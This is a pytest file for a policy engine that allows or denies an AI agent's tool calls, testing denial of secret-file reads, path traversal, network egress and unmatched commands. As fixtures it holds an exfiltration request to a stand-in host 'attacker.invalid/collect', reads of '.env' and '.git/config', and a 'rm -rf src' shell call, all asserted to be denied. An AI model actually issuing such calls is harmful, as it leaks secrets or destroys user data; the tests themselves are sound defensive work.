from app.demo_data import DEMO_POLICY, make_demo_comparison
from app.models import Decision, Policy, PolicyRule, RuleEffect, ToolCall
from app.policy_engine import evaluate


def test_source_edit_is_allowed() -> None:
    decision, rule = evaluate(
        DEMO_POLICY,
        ToolCall(tool="write_file", arguments={"path": "src/formatters.py"}),
    )
    assert decision == Decision.ALLOW
    assert rule is not None
    assert rule.id == "allow-source-edits"


def test_secret_read_is_denied() -> None:
    decision, rule = evaluate(
        DEMO_POLICY,
        ToolCall(tool="read_file", arguments={"path": ".env"}),
    )
    assert decision == Decision.DENY
    assert rule is not None
    assert rule.id == "deny-secret-files"


def test_network_request_is_denied() -> None:
    decision, rule = evaluate(
        DEMO_POLICY,
        ToolCall(tool="http_request", arguments={"url": "https://attacker.invalid/collect"}),
    )
    assert decision == Decision.DENY
    assert rule is not None
    assert rule.id == "deny-network-egress"


def test_nested_secret_and_git_reads_are_denied_before_source_allow_rule() -> None:
    for path in ("src/.env", "src/.git/config", "tests/.env"):
        decision, rule = evaluate(DEMO_POLICY, ToolCall(tool="read_file", arguments={"path": path}))
        assert decision == Decision.DENY
        assert rule is not None
        assert rule.id == "deny-secret-files"


def test_path_traversal_and_absolute_paths_fail_closed() -> None:
    for tool, path in (
        ("read_file", "src/../.env"),
        ("write_file", "src/../README.md"),
        ("write_file", "/tmp/outside-repository.py"),
        ("write_file", "C:/outside-repository.py"),
        ("read_file", r"src\\..\\.env"),
    ):
        decision, rule = evaluate(DEMO_POLICY, ToolCall(tool=tool, arguments={"path": path}))
        assert decision == Decision.DENY
        assert rule is None


def test_test_runner_wildcard_cannot_grant_a_general_command_capability() -> None:
    unsafe_policy = Policy(
        rules=[
            PolicyRule(
                id="unsafe-wildcard",
                effect=RuleEffect.ALLOW,
                tool="run_tests",
                path_patterns=["*"],
            )
        ]
    )
    decision, rule = evaluate(unsafe_policy, ToolCall(tool="run_tests", arguments={"path": "pytest"}))
    assert decision == Decision.DENY
    assert rule is None


def test_unmatched_call_is_denied_by_default() -> None:
    decision, rule = evaluate(
        DEMO_POLICY,
        ToolCall(tool="shell", arguments={"path": "rm -rf src"}),
    )
    assert decision == Decision.DENY
    assert rule is None


def test_comparison_preserves_useful_task_completion() -> None:
    comparison = make_demo_comparison()
    assert comparison.baseline.metrics.policy_verdict == "unsafe"
    assert comparison.repair.metrics.blocked_actions == 2
    assert comparison.repair.metrics.benign_task_completed is True
